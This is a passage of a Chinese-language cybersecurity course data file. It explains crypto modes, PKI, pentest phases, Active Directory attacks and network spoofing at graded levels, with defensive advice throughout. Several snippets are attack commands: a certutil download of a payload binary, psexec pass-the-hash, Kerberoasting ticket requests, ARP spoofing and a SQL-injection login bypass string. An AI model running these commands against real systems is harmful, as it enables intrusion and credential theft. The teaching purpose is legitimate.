            "初级": "常见模式：ECB（相同明文→相同密文，不安全，绝不用）、CBC（需随机 IV，串行）、CTR（可并行，靠 nonce）、GCM/CCM（AEAD，同时提供加密+完整性校验）。核心纪律：IV/nonce 必须随机且永不重复使用。",
            "中级": "攻击：ECB 块重排与图像还原、CBC 填充预言机（POODLE/Lucky13）、CTR/GCM 下 nonce 复用导致密钥流重用（一次性泄露明文异或）、CBC 字节翻转（改 IV 影响首块明文）。",
            "高级": "深入理解 AEAD 为何是默认选择、nonce 管理策略（计数 vs 随机）、以及为何「不要自己拼模式组合（如 CBC+MAC 顺序错）」。模式错误是密码学实现事故的最高频来源之一。"
          },
          codeLang: "python",
          code:
`# ✅ 优先使用 AEAD（GCM）：加密同时校验完整性
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os
key = AESGCM.generate_key(bit_length=128)
aes = AESGCM(key)
nonce = os.urandom(12)                        # 每次必须不同
ct = aes.encrypt(nonce, b"secret message", associated_data=None)
# ❌ 危险：ECB 模式（相同明文块→相同密文块，暴露结构）
# from cryptography.hazmat.primitives.ciphers import algorithms, modes
# cipher = Cipher(algorithms.AES(key), modes.ECB())`,
          tool: "cryptography 库、CyberChef、openssl",
          refs: "NIST SP 800-38A/38D；AES-GCM 使用规范"
        },
        {
          id: "pki", name: "数字证书与 PKI", level: "中级",
          summary: "X.509 证书、信任链与 CA 模型，以及证书校验与吊销要点。",
          keywords: ["证书","数字证书","pki","公钥基础设施","x509","ca","证书颁发机构","信任链","ssl证书","自签名","吊销","ocsp"],
          levels: {
            "入门": "你怎么确定「这个网站的公钥真的是它的」？靠证书：一个权威机构（CA）用它的私钥给网站公钥「签字担保」。浏览器内置了一堆受信 CA，顺着这条「信任链」就能验证网站身份。",
            "初级": "X.509 证书结构（主体、公钥、签发者、有效期、签名）。信任模型：根 CA→中间 CA→站点证书。校验要点：域名匹配、有效期、签名有效、吊销状态（CRL/OCSP）、不信任自签名。防御视角：私钥保护好、用受信 CA、启用 CT 日志。",
            "中级": "风险：CA 被攻破或误签发、域名验证（DCV）被绕过、证书透明（CT）缺失导致恶意证书难发现、OCSP 隐私/可用性问题（OCSP Stapling 缓解）。理解「信任锚」为何是系统安全根基。",
            "高级": "深入证书绑定（证书/公钥 pinning）、mTLS（双向认证）、以及后量子时代证书与混合密钥的演化。PKI 不解决「密钥是否真由持有者控制」，只是把身份与公钥绑定——密钥保管才是薄弱环节。"
          },
          codeLang: "bash",
          code:
`# 查看站点证书链与基本信息
openssl s_client -connect example.com:443 -servername example.com </dev/null 2>/dev/null | openssl x509 -noout -issuer -subject -dates
# 校验证书是否被吊销（OCSP）
openssl ocsp -issuer chain.pem -cert site.pem -url http://ocsp.example.com
# ✅ 部署建议：受信 CA 签发 + 启用 OCSP Stapling + 证书透明日志`,
          tool: "openssl、testssl.sh、证书透明日志（crt.sh）",
          refs: "RFC 5280（X.509）；RFC 6962（证书透明）"
        },
        {
          id: "crypto-misuse", name: "密码学原语误用", level: "中级",
          summary: "使用了正确算法却以错误方式使用（ECB、弱随机、自研算法、密钥硬编码）导致形同虚设。",
          keywords: ["密码学误用","ecb","弱随机","硬编码密钥","自定义算法","iv复用","padding"],
          levels: {
            "入门": "加密算法再强，用错了也白搭。比如用每个方块单独加密的模式，图案会暴露；或者用每次都不同的随机数却用了固定的，别人能反推。",
            "初级": "常见误用：ECB 模式（相同明文变相同密文，暴露结构）、IV 复用（CTR/GCM 下致命）、弱随机数（rand()/time 做密钥）、密钥硬编码在代码、用 MD5/SHA1 做密码哈希（应 bcrypt/argon2）、自研加密算法。",
            "中级": "实战：识别模式（看密文分块规律判断 ECB）；检查 IV/nonce 是否随机且唯一；密码存储必须用慢哈希加盐。正确组合：AES-GCM（认证加密）、RSA-OAEP（非 Textbook RSA）、Argon2 存密码。",
            "高级": "深入：非对称加密的填充预言（Bleichenbacher）、GCM nonce 复用导致明文恢复、以及密钥管理（KMS/信封加密）远比重算算法更重要。强调：密码学正确性的 90% 在用法与密钥管理，不在算法本身。"
          },
          codeLang: "python",
          code:
`# ❌ 危险：ECB 模式 + 弱随机 + 明文哈希
cipher = AES.new(key, AES.MODE_ECB)
h = hashlib.md5(password).hexdigest()   # 快哈希，易被彩虹表

# ✅ 安全：GCM 认证加密 + Argon2 存密码
cipher = AES.new(key, AES.MODE_GCM)
h = argon2.hash(password)                # 慢哈希 + 盐`,
          tool: "CyberChef、openssl、测试向量",
          refs: "NIST SP 800-38D；OWASP 密码存储备忘单"
        },
        {
          id: "side-channel", name: "侧信道攻击简介", level: "高级",
          summary: "不攻破算法本身，而是利用时间、功耗、电磁等物理泄露恢复密钥。",
          keywords: ["侧信道","timing attack","时序攻击","功耗分析","缓存攻击","旁路","dpa"],
          levels: {
            "入门": "有些密码校验算得越快说明越接近正确，攻击者靠测量耗时长短就能一点点猜出密码，不用真的破解算法。",
            "初级": "类型：时序攻击（比较字符串或解密是否恒定时间）、功耗分析（DPA/SPA）、缓存攻击（Flush+Reload）、电磁或声学泄露。经典：非恒定时间字符串比较导致口令逐字节泄露。",
            "中级": "实战：用恒定时间比较（crypto_verify）；注意分支或查表依赖密钥（避免密钥相关的内存访问模式）；测量响应时间差异推断。防护：恒定时间实现、盲化、噪声注入。",
            "高级": "深入：基于缓存的跨进程密钥恢复、Rowhammer 与侧信道结合、以及云多租户下的共置攻击。强调：侧信道证明逻辑正确不等于实现安全，高价值实现必须恒定时间。"
          },
          codeLang: "python",
          code:
`# ❌ 危险：非恒定时间比较（时长随匹配前缀增长）
def eq(a, b):
    for i in range(len(a)):
        if a[i] != b[i]: return False
    return True

# ✅ 安全：恒定时间比较
def eq_safe(a, b):
    return hmac.compare_digest(a, b)   # 无论差异在哪都花相同时间`,
          tool: "microbenchmark、缓存攻击 PoC",
          refs: "CWE-208（时序侧信道）；LadderLeak"
        }
      ]
    },

    /* ---------------- 渗透测试 ---------------- */
    {
      id: "pentest", name: "渗透测试", icon: "🎯",
      desc: "方法论与流程：授权前提下的信息收集、漏洞利用、后渗透与报告。",
      topics: [
        {
          id: "recon", name: "信息收集", level: "入门",
          summary: "资产、域名、端口、服务的被动/主动侦察。",
          keywords: ["信息收集","侦察","recon","nmap","子域名","端口扫描","whois","资产","被动侦察","主动侦察"],
          levels: {
            "入门": "动手测试前先「摸清家底」：这个组织有哪些域名、IP、开放了哪些端口和服务。信息越全，可下手的点越多。一切必须基于授权范围。",
            "初级": "被动：WHOIS、证书透明度（crt.sh）、搜索引擎、GitHub 泄露。主动：端口扫描（Nmap）、服务指纹、目录爆破（gobuster）。产出资产清单。",
            "中级": "OSINT 技巧、DNS 区域传输、ASN 枚举、WAF/CDN 识别、云资产（S3/OSS 桶）发现。结合 Shodan/Censys。",
            "高级": "自动化资产测绘、攻击面管理（ASM）思路、以及如何在红蓝对抗中系统化收敛范围并出具侦察报告。"
          },
          codeLang: "bash",
          code:
`# ✅ 仅对【你拥有授权】的目标做端口与版本探测
nmap -sV -sC -oA report 10.10.10.10
# 子域名枚举（授权域名）
subfinder -d example.com -o subs.txt
# 目录/接口发现
gobuster dir -u https://example.com -w wordlist.txt`,
          tool: "Nmap、subfinder、amass、gobuster、crt.sh",
          refs: "MITRE ATT&CK Reconnaissance；Nmap 官方文档"
        },
        {
          id: "scan", name: "漏洞扫描与验证", level: "初级",
          summary: "用工具发现疑似漏洞并人工验证，避免误报。",
          keywords: ["漏洞扫描","scanner","漏洞验证","误报","nuclei","nessus","awvs","poc","exp"],
          levels: {
            "入门": "扫描器像「自动体检」，能列出一堆疑似问题。但它会误报，必须人工确认每条是否真的存在、是否在授权范围内，再决定是否深入。",
            "初级": "工具：Nuclei（模板化）、Nessus、OpenVAS、AWVS。流程：扫描 → 去重 → 人工验证（PoC） → 定级（CVSS）。注意：扫描动作本身也可能影响业务，需获书面授权与窗口期。",
            "中级": "编写/裁剪 Nuclei 模板、理解扫描器指纹逻辑、结合版本比对（CVE 匹配）。区分信息/低/中/高/危重。",
            "高级": "建立企业级漏洞管理闭环（发现-验证-修复-复测）、误报治理，以及与 SRC/赏金计划协作。"
          },
          codeLang: "bash",
          code:
`# ✅ Nuclei 对授权目标跑社区模板（仅授权范围）
nuclei -u https://example.com -t cves/ -o results.txt
# 注意：扫描前确认书面授权，避免影响生产系统`,
          tool: "Nuclei、Nessus、OpenVAS",
          refs: "CIS 基准；CVSS 3.1 规范"
        },
        {
          id: "privesc", name: "权限提升", level: "中级",
          summary: "从低权限用户到系统/域控提权。",
          keywords: ["提权","privilege escalation","privesc","sudo","suid","内核漏洞","window提权","令牌","计划任务"],
          levels: {
            "入门": "拿到一个普通账号后，想办法变成管理员/root，才能做更多事。常见口子：配置错误的计划任务、可写的服务路径、过时的内核漏洞。",
            "初级": "Linux：SUID 滥用、sudo 误配（sudo -l）、cron、可写文件、内核 exp。Windows：服务权限、始终安装提权、令牌冒充、未打补丁。",
            "中级": "系统化枚举（LinPEAS/WinPEAS）、利用漏洞与配置弱点组合、建立稳定提权路径而非单点 exp。",
            "高级": "域环境（AD）提权：Kerberoasting、ACL 滥用、委派；以及缓解视角（最小权限、补丁、加固）。"
          },
          codeLang: "bash",
          code:
`# 枚举提权线索（在已授权主机上）
sudo -l                 # 查看可免密执行的命令
find / -perm -4000 2>/dev/null   # 找 SUID 文件
# ✅ 防御：最小权限、及时打补丁、审计 sudoers`,
          tool: "LinPEAS、WinPEAS、GTFOBins、BloodHound",
          refs: "GTFOBins；MITRE ATT&CK Privilege Escalation"
        },
        {
          id: "lateral", name: "横向移动", level: "中级",
          summary: "在内网中从一台主机移动到其他主机/域控。",
          keywords: ["横向移动","lateral","内网","pth","黄金票据","pass the hash","smb","域渗透","凭证窃取"],
          levels: {
            "入门": "攻陷一台机器后，用它作跳板去碰同一内网的其他机器（因为内网彼此更信任）。常见：用偷来的密码/哈希登录别的机器。",
            "初级": "技术：Pass-the-Hash/Pass-the-Ticket、SMB/WinRM 横向、票据（Silver/Golden Ticket）、凭证导出（Mimikatz，仅授权演练）。",
            "中级": "域环境：BloodHound 路径分析、ACL 攻击、委派利用；Linux 内网：SSH 密钥复用、内网服务跳板。",
            "高级": "复杂杀伤链建模、检测与狩猎（EDR/SIEM 视角），以及红队如何在授权范围约束下收敛行为。"
          },
          codeLang: "powershell",
          code:
`# ⚠️ 仅用于授权演练环境；以下展示的是【检测与防御】关注点
# 防御侧：启用 LSA 保护、限制本地管理员横向、部署凭据守卫
# 攻击侧（示意）：Mimikatz 导出需管理员且明显触发 EDR，故现代实战更依赖无文件技术`,
          tool: "BloodHound、Impacket、CrackMapExec（授权环境）",
          refs: "MITRE ATT&CK Lateral Movement；AD 安全红皮书"
        },
        {
          id: "report", name: "后渗透与报告", level: "初级",
          summary: "保持访问、收集证据并以可落地方式交付报告。",
          keywords: ["后渗透","报告","report","证据","截图","修复建议","cvss","交付","复盘"],
          levels: {
            "入门": "找到漏洞不是终点。要整理清楚：在哪、怎么复现、影响多大、怎么修。给客户/团队一份能直接行动的修复报告，比炫技更重要。",
            "初级": "报告要素：概述、范围、方法论、漏洞清单（复现步骤+截图+影响+POC）、风险评级（CVSS）、修复建议、附时间线。证据留痕要完整可追溯。",
            "中级": "量化业务影响、给出优先级与加固路线、区分「可被利用」与「理论存在」。后渗透中保持访问须谨慎且合法（持久化仅限授权演练）。",
            "高级": "与安全运营（SOC）对接复测闭环、建立可度量的安全改善指标，并推动流程与架构层面的长治久安。"
          },
          codeLang: "markdown",
          code:
`# 渗透测试报告模板（片段）
## 漏洞：SQL 注入（高危）
- 位置：/login 用户名参数
- 复现：' OR '1'='1 绕过登录
- 影响：越权访问、数据泄露
- 修复：参数化查询 + 最小权限 DB 账号
- 证据：附请求/响应截图与时间戳`,
          tool: "Markdown、截图、CVSS 计算器",
          refs: "OWASP WSTG；渗透测试执行标准 PTES"
        },
        {
          id: "oauth", name: "OAuth/SSO 攻击", level: "中级",
          summary: "OAuth2/OIDC 授权流程中的实现缺陷与令牌泄露。",
          keywords: ["oauth","oidc","单点登录","sso","授权码","redirect uri","令牌","id token","开放授权"],
          levels: {
            "入门": "很多网站用「微信/Google 登录」。背后是 OAuth 这套授权协议：你授权第三方应用访问你的部分信息。如果实现不严谨，攻击者可能偷到令牌或冒用登录。",
            "初级": "常见坑：redirect_uri 未校验被劫持到攻击者站、授权码被截获重放、implicit 流程令牌留在 URL、state 缺失导致 CSRF、id_token 不验签名。防御：严格校验 redirect_uri、用 PKCE、校验 nonce/aud。",
            "中级": "利用：redirect_uri 绕过（开放重定向拼接）、PKCE 缺失下的授权码注入、refresh token 泄露、scope 膨胀。结合 XSS 偷 token。",
            "高级": "深入 OIDC 混合流、JWT 与 OAuth 的交叉陷阱、以及「登录 CSRF」对业务的影响。OAuth 是框架不是安全保证，安全取决于正确实现与威胁建模。"
          },
          codeLang: "http",
          code:
`# ✅ 授权码流程务必用 PKCE + state，并严格白名单 redirect_uri
# 客户端：生成 code_verifier + code_challenge=BASE64URL(SHA256(verifier))
# 服务端：校验 redirect_uri 完全匹配、code 仅可用一次、state 防 CSRF
# ❌ 危险：implicit 流程把令牌放 URL fragment，易被泄漏`,
          tool: "Burp、OAuth 测试清单、JWT 工具（授权）",
          refs: "RFC 6749/8252；OWASP OAuth2 备忘"
        },
        {
          id: "cloud", name: "云安全基础", level: "中级",
          summary: "云环境（AWS/GCP）常见错误配置与元数据/凭据泄露。",
          keywords: ["云安全","云","aws","s3","gcp","元数据","imds","凭据泄露","对象存储","桶"],
          levels: {
            "入门": "现在大量系统跑在云上（阿里云/腾讯云/AWS/GCP）。云上最常见的不是 0day，而是「配置错了」：公开的对象存储桶、写死的密钥、过宽的权限，导致数据外泄。",
            "初级": "典型风险：S3/OSS 桶公开可读/可写、AK/SK 泄露（代码/前端/日志）、IMDSv1 被 SSRF 读取拿临时凭证、安全组暴露 22/3389。防御：桶私有+加密、密钥轮转、IMDSv2。",
            "中级": "利用：枚举公开桶、从前端 JS 提取 AK、SSRF 打 169.254.169.254、IAM 权限枚举（权限过大）。组合 SSRF→元数据→提权是云上经典链。",
            "高级": "深入 IAM 策略评估逻辑、角色扮演链、跨账户访问、以及云原生威胁检测（CloudTrail/GuardDuty）。云安全是「配置即代码」的纪律问题。"
          },
          codeLang: "bash",
          code:
`# ✅ 启用 IMDSv2（防 SSRF 读元数据）+ 桶私有加密
# AWS CLI 强制 hop limit=1 且需 token
aws ec2 modify-instance-metadata-options --http-tokens required --http-put-response-hop-limit 1
# ✅ S3 桶禁止公开、启用默认加密与版本控制`,
          tool: "ScoutSuite、Prowler、云厂商配置审计（授权）",
          refs: "AWS Well-Architected 安全；CIS 云基准"
        },
        {
          id: "ad", name: "域渗透 AD", level: "高级",
          summary: "Active Directory 域渗透：票据、委派与 ACL 滥用。",
          keywords: ["域渗透","active directory","ad","kerberos","白银票据","黄金票据","kerberoasting","委派","bloodhound"],
          levels: {
            "入门": "企业内网常用 Windows 域（Active Directory）统一管理账号和电脑。域渗透就是研究如何在已获一定权限后，沿着域里的信任关系一步步拿到「域控」最高权限。",
            "初级": "基础：Kerberos 认证、AS-REQ/AS-REP（无预认证可离线爆破用户）、Service Ticket（Kerberoasting 爆破服务账户）、黄金/白银票据。工具：Impacket、BloodHound。",
            "中级": "利用：Kerberoasting、AS-REP Roasting、委派滥用（约束/非约束）、ACL 攻击（DCSync 权限）、NTLM 中继。BloodHound 找最短提权路径。",
            "高级": "深入票据生命周期、组策略滥用、以及检测与狩猎（EDR/SIEM 视角）。域渗透多在「已授权红队」范围内，防御要靠最小权限+审计+EDR。"
          },
          codeLang: "powershell",
          code:
`# ⚠️ 仅授权演练；以下聚焦【检测与防御】
# 防御侧：启用 LSA 保护、审计 Kerberos、限制委派、部署凭据守卫与 EDR
# 攻击侧（示意，触发 EDR）：Rubeus kerberoast / mimikatz sekurlsa`,
          tool: "BloodHound、Impacket、Rubeus（授权环境）",
          refs: "MITRE ATT&CK；AD 安全红皮书"
        },
        {
          id: "osint", name: "开源情报收集 OSINT", level: "入门",
          summary: "从公开渠道合法收集目标信息（子域/员工/技术栈），是授权测试信息收集阶段。",
          keywords: ["osint","开源情报","公开来源情报","信息收集","reconnaissance","子域名","泄露查询","whois","证书透明","攻击面"],
          levels: {
            "入门": "攻击前先「摸情况」。OSINT 指从公开渠道（官网、社交平台、Whois、代码仓库、泄露库）合法收集目标信息——员工、邮箱、子域名、技术栈。这是授权渗透测试信息收集阶段的重要部分。",
            "初级": "常用来源：Whois/ASN、子域名枚举（证书透明日志、DNS）、GitHub/代码泄露（密钥、内部路径）、搜索引擎语法（site:/filetype:）、泄露查询。纪律：仅收集授权目标、不触碰未授权个人数据。",
            "中级": "实战：用 CT 日志被动收集子域、从 JS 提取 API 端点、员工邮箱→钓鱼/口令爆破面、把零散信息拼出攻击面图。与被动扫描结合，降低对目标的直接探测。",
            "高级": "深入情报关联分析、自动化采集管线、以及「防御侧」如何用 OSINT 做攻击面管理（ASM）与暴露面收敛。OSINT 强调合规边界：仅用于授权范围与自身资产盘点。"
          },
          codeLang: "bash",
          code:
`# 被动收集：从证书透明日志枚举子域（无需直接探测目标）
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u
# Whois 与 ASN 信息（公开、合法）
whois example.com
# ⚠️ 仅对授权目标执行；不收集/利用未授权个人隐私数据`,
          tool: "theHarvester、amass、crt.sh、Maltego（授权）",
          refs: "OWASP Amass 文档；OSINT 框架（osintframework.com）"
        },
        {
          id: "social", name: "社会工程与钓鱼", level: "初级",
          summary: "利用人的信任/疏忽（钓鱼邮件、冒充、诱饵）突破技术防线；红队检验意识。",
          keywords: ["社会工程","社工","钓鱼","phishing","鱼叉钓鱼","pretexting","诱饵","冒充","安全意识","红队","bcc"],
          levels: {
            "入门": "再坚固的技术防线，也可能被「骗人」攻破。社会工程利用人的信任或疏忽：伪装成同事要密码、发带毒的邮件让你点开。钓鱼邮件就是最常见的例子。防御靠「人」的安全意识。",
            "初级": "常见手法：钓鱼邮件（伪造发件人/紧急话术）、鱼叉钓鱼（针对特定人定制）、诱饵（U 盘/下载）、冒充（IT 支持要验证码）、pretexting（编造场景套信息）。红队用它检验防护与意识。防御：验证身份（电话回拨）、不点不明链接、MFA、邮件防伪（DMARC/DKIM/SPF）。",
            "中级": "实战（授权红队）：克隆登录页收凭证、恶意附件（宏/快捷方式）、结合 OSINT 定制话术、用相似域名（typosquatting）提升可信度。评估的是「流程与人」而非纯技术。",
            "高级": "深入商业邮件诈骗（BEC）、供应链社工、以及度量安全意识成熟度（钓鱼演练通过率）。强调：社工是「信任」攻击，防护要把技术控制（MFA/零信任）与人的培训结合，且红队必须严格授权与去危害化。"
          },
          codeLang: "http",
          code:
`# ✅ 邮件防伪三件套（防御侧，降低钓鱼成功率）
# DNS 中配置：
#   SPF：v=spf1 include:_spf.example.com ~all
#   DKIM：邮件签名，公钥发布在 DNS
#   DMARC：v=DMARC1; p=reject; rua=mailto:sec@example.com
# ✅ 用户侧：收到「紧急改密码/验证码」一律电话回拨官方核实，不点链接`,
          tool: "GoPhish（授权钓鱼演练）、邮件头分析、DMARC 检测",
          refs: "NIST SP 800-63B；反钓鱼工作手册；OWASP 社会工程"
        },
        {
          id: "priv-esc", name: "权限提升", level: "高级",
          summary: "在拿到低权限 shell 后，利用系统配置、内核或服务缺陷升至 root/System。",
          keywords: ["权限提升","privilege escalation","提权","sudo","内核漏洞","计划任务","root","system"],
          levels: {
            "入门": "拿到一个普通账号后，想拿到最高权限（管理员/root）。办法是找系统里配错或存在漏洞的地方，借它提升自己的权力。",
            "初级": "Linux：sudo 误配置（NOPASSWD 加可写脚本）、SUID 二进制、cron 任务、内核漏洞（脏牛等）。Windows：计划任务、服务权限、AlwaysInstallElevated、令牌冒充。工具：LinPEAS/WinPEAS 自动化枚举。",
            "中级": "实战：跑 PEAS 脚本看高亮项；检查可写路径或服务；利用暴露的凭据（history、配置文件）。防御：最小化 sudo、及时打补丁、限制服务权限。",
            "高级": "深入：内核利用的可靠性与崩溃风险、DLL 劫持链、以及从用户态到内核态的完整提权。强调：提权本质是信任边界上的配置错误被放大。"
          },
          codeLang: "bash",
          code:
`sudo -l                       # 看当前用户能以谁的身份跑什么
find / -perm -4000 2>/dev/null   # 找 SUID 二进制
# ❌ 危险：NOPASSWD 且脚本可写 -> 直接提权
(ALL) NOPASSWD: /home/user/backup.sh`,
          tool: "LinPEAS、WinPEAS、GTFOBins、PowerUp",
          refs: "GTFOBins；MITRE ATT&CK 提权；PEAS 文档"
        },
        {
          id: "av-bypass", name: "免杀与 AV 绕过", level: "高级",
          summary: "理解终端防护检测逻辑，掌握载荷编码、混淆与合法化（LOLBins）以通过授权测试。",
          keywords: ["免杀","av bypass","反病毒","载荷","编码","lolbins","edr","混淆"],
          levels: {
            "入门": "安全软件会扫描可疑程序。做授权测试时，为了让自己的测试工具不被误杀，需要理解它的检测规则并合理绕过——但绝不可用于恶意目的。",
            "初级": "检测维度：签名（哈希或字节）、行为（API 序列）、启发式。绕过：载荷编码或加密（运行时解密）、分离加载器与主体、利用系统自带合法程序（LOLBins：certutil、mshta）。强调：仅授权环境、且以评估防御有效性为目的。",
            "中级": "实战：用 msfvenom 编码做基础规避（常被秒杀，仅作基线）；自写加载器（API 动态解析、沙箱规避）；利用可信二进制执行。防御侧：EDR 的行为与内存扫描远强于传统 AV。",
            "高级": "深入：AMSI 绕过、进程注入（Early Bird/Thread Hijacking）、以及内存中无文件载荷。强调：免杀是攻防持续对抗，目的是验证即便载荷落地，EDR 能否拦截，不是炫技。"
          },
          codeLang: "powershell",
          code:
`# 仅授权测试：用系统自带工具落地（LOLBin 思路示意）
# 从可信源拉取并内存加载，避免落盘被扫描
# 真实用法需结合授权范围与防御评估目标
certutil -urlcache -split -f http://internal/share/agent.bin`,
          tool: "msfvenom、Cobalt Strike（授权）、LOLBAS 项目",
          refs: "LOLBAS 项目；MITRE ATT&CK 防御绕过；仅授权测试"
        }
      ]
    },
    /* ---------------- 网络与内网安全 ---------------- */
    {
      id: "network", name: "网络与内网安全", icon: "🛰️",
      desc: "覆盖网络协议、资产测绘、局域网中间人、内网横向移动与域渗透，是红队进阶与内网防御的核心。",
      topics: [
        {
          id: "net-proto", name: "网络协议安全基础", level: "入门",
          summary: "理解 TCP/IP 分层与明文协议风险，是网络攻防与流量分析的基础。",
          keywords: ["网络协议","tcp/ip","三次握手","明文","arp","dns","分包","嗅探"],
          levels: {
            "入门": "互联网靠一套规则（协议）传数据。很多老协议是明文传输，别人在边上就能看到内容；理解这些规则才能发现哪里不安全。",
            "初级": "要点：TCP 三次握手与四次挥手、IP 路由、UDP 无连接；明文协议（HTTP/Telnet/FTP）易被嗅探；ARP/DNS 可被欺骗；分片与重组的处理差异可制造异常。基础工具：Wireshark 抓包看明文。",
            "中级": "实战：用 Wireshark 识别明文凭据、分析会话、定位异常包；理解 MTU/分片对 IDS 的影响；为后续 MITM 打基础。防御：全链路加密（HTTPS/TLS、SSH、VPN）、禁用明文服务。",
            "高级": "深入：协议状态机差异导致的绕过、IPv6 过渡机制（双栈）的新攻击面、以及在内网中用协议特性做隐蔽通信。强调：协议安全的核心是默认不信任网络、敏感数据必须加密。"
          },
          codeLang: "bash",
          code:
`# 抓包看明文（仅授权/本机）
tcpdump -i eth0 -A port 80       # 看 HTTP 明文内容
# 防御：用 TLS 替代，禁用明文服务
#   telnet -> ssh；ftp -> sftp；http -> https`,
          tool: "Wireshark、tcpdump、tshark",
          refs: "RFC 791/793；TCP/IP 详解；Wireshark 文档"
        },
        {
          id: "port-scan", name: "端口扫描与资产测绘", level: "初级",
          summary: "通过扫描识别开放端口、服务与版本指纹，绘制攻击面。",
          keywords: ["端口扫描","nmap","资产测绘","指纹","服务识别","syn扫描","banner"],
          levels: {
            "入门": "一个服务器开了很多门（端口），每个门后是一种服务。扫描就是逐个敲门，看哪些门开着、后面是什么，从而知道能从哪下手。",
            "初级": "Nmap 核心：TCP SYN 扫描（-sS，半开、隐蔽）、全连接（-sT）、UDP（-sU）、服务与版本探测（-sV）、OS 探测（-O）、脚本（-sC）。输出：开放端口 + 服务 + 版本 + 可能漏洞。合规：仅授权目标。",
            "中级": "实战：先全端口速扫再针对详扫；用 -sV 拿版本匹配 CVE；NSE 脚本做基础漏洞与配置检查；输出 XML 进资产管理。防御：最小化开放端口、用防火墙或主机隔离、关闭无用服务。",
            "高级": "深入：扫描规避（慢速/分片/诱饵）、指纹伪造识别、以及把扫描结果结构化进 CMDB 与攻击面管理（ASM）。强调：攻击者用扫描摸清家底，防御者更该先于攻击者看到自己的暴露面。"
          },
          codeLang: "bash",
          code:
`# 授权目标资产测绘
nmap -sS -sV -O -p- --min-rate 1000 target.com -oX out.xml
# -sS 半开扫描；-sV 版本；-O 系统；-p- 全端口`,
          tool: "Nmap、Masscan、RustScan",
          refs: "Nmap 官方文档；OWASP 资产识别"
        },
        {
          id: "arp-dns", name: "ARP/DNS 欺骗", level: "中级",
          summary: "在局域网内伪造地址解析，实施中间人（MITM）劫持流量。",
          keywords: ["arp欺骗","dns欺骗","mitm","中间人","嗅探","arp spoof","ettercap","cain"],
          levels: {
            "入门": "局域网里电脑靠名字到地址的广播来通信。攻击者假装自己是网关或某台机器，就能让别人的流量先经过自己，从而偷看或篡改。",
            "初级": "ARP 欺骗：伪造 ARP 应答，把受害者流量引到攻击者（配合转发可透明 MITM）。DNS 欺骗：污染缓存或回复假 IP，把域名指向恶意服务器。后果：凭据嗅探、会话劫持、钓鱼。工具：Ettercap、arpspoof。",
            "中级": "实战：开启 IP 转发避免断网；arpspoof 双向欺骗；用 Wireshark 看被劫持的明文会话；配合 SSLstrip 尝试降级 HTTPS。防御：静态 ARP 或 DAI（动态 ARP 检测）、DNSSEC、全 HTTPS（HSTS）。",
            "高级": "深入：IPv6 下的 ND（邻居发现）欺骗、企业网段隔离与 802.1X、以及 ARP 欺骗在红队中的横向定位价值。强调：二层欺骗的根本缓解是网络分段 + 端口安全 + 加密。"
          },
          codeLang: "bash",
          code:
`# 授权内网测试：双向 ARP 欺骗（需开启转发）
sysctl -w net.ipv4.ip_forward=1
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1   # 受害者 <-> 网关
# 防御：交换机启用 DAI（Dynamic ARP Inspection）+ DHCP Snooping`,
          tool: "Ettercap、arpspoof、Bettercap",
          refs: "MITRE T1557（中间人）；局域网安全技术"
        },
        {
          id: "net-lateral", name: "内网横向移动", level: "高级",
          summary: "突破边界进入内网后，借助凭据复用与信任关系在网络内扩散。",
          keywords: ["横向移动","lateral movement","凭据传递","pth","wmi","psexec","ipc$","pass the hash"],
          levels: {
            "入门": "进了内网一台机器后，不直接走，而是利用这台机器上保存的密码或信任关系，去控制更多机器，一步步逼近重要目标。",
            "初级": "手段：凭据传递（Pass-the-Hash/Pass-the-Ticket）、WMI/PsExec 远程执行、IPC$ 共享、计划任务、远程服务。前提：往往来自弱密码、凭据复用、未做网络隔离。工具：Impacket、CrackMapExec。",
            "中级": "实战：导出内存哈希（Mimikatz，授权）；PTH 横向到其它主机；利用共享管理员账号批量移动；定位域控。防御：分层凭据、LAPS 随机化本地管理员、网络微隔离、特权访问管理（PAM）。",
            "高级": "深入：票据委派（约束/无约束）滥用、从主机到云的横向（Azure AD）、以及 living-off-the-land 减少痕迹。强调：横向移动依赖扁平网络 + 凭据复用，分段与最小权限是最好的止血。"
          },
          codeLang: "bash",
          code:
`# 授权测试：凭据传递横向（Impacket 示意）
# 用抓到的 NTLM 哈希直接认证，无需明文密码
psexec.py DOMAIN/user@target -hashes :<NTLM>
# 防御：LAPS 随机化本地管理员密码 + 网络分段 + 禁用明文凭据缓存`,
          tool: "Impacket、CrackMapExec、Mimikatz（授权）",
          refs: "MITRE ATT&CK 横向移动；Red Forest/PAM 设计"
        },
        {
          id: "ad-pentest", name: "域渗透 Active Directory", level: "高级",
          summary: "针对企业域环境的认证协议与信任关系实施攻击（Kerberos 等）。",
          keywords: ["域渗透","active directory","kerberos","黄金票据","白银票据","as-rep roasting","spn","委派"],
          levels: {
            "入门": "公司里常有一台总管机器（域控）管所有账号。域渗透就是研究这套管理机制里的弱点，拿到最高权限。",
            "初级": "Kerberos 流程：AS-REQ/AS-REP（拿 TGT）、TGS-REQ/TGS-REP（拿服务票据）。攻击：AS-REP Roasting（无预认证账号）、Kerberoasting（破服务票据密码）、委派滥用。工具：Impacket GetNPUsers/GetUserSPNs。",
            "中级": "实战：查找无预认证用户做 AS-REP Roasting；请求 SPN 票据离线爆破；利用约束委派到无约束委派；伪造票据（黄金/白银，需 krbtgt 哈希）。防御：强密码加审计、减少委派、启用 PAC 验证。",
            "高级": "深入：DCSync（模拟域控复制）、基于 ACL 的域对象滥用、以及 BloodHound 路径分析找最短提权链。强调：AD 安全靠最小权限的 ACL + 强凭据 + 持续审计，票据类攻击本质是密钥或权限管理失当。"
          },
          codeLang: "bash",
          code:
`# 授权测试：Kerberoasting 请求服务票据（Impacket）
GetUserSPNs.py DOMAIN/user:pass -request -output tickets.txt
# 离线用 hashcat 爆破服务账号弱密码
# 防御：服务账号强密码 + 定期轮换 krbtgt 密钥（两次）`,
          tool: "Impacket、BloodHound、Cerbero",
          refs: "MITRE ATT&CK 域滥用；AD 安全运维"
        },
        {
          id: "fw-bypass", name: "防火墙/IDS/IPS 绕过", level: "中级",
          summary: "利用检测规则的盲区与协议特性，规避网络边界防护。",
          keywords: ["防火墙绕过","ids ips 绕过","分片","低速扫描","加密隧道","evasion","waf绕过"],
          levels: {
            "入门": "防火墙像看门的，按规则放人或拦人。攻击者会想规则没覆盖的招数，比如把数据拆碎、走加密通道，让它看不清从而放行。",
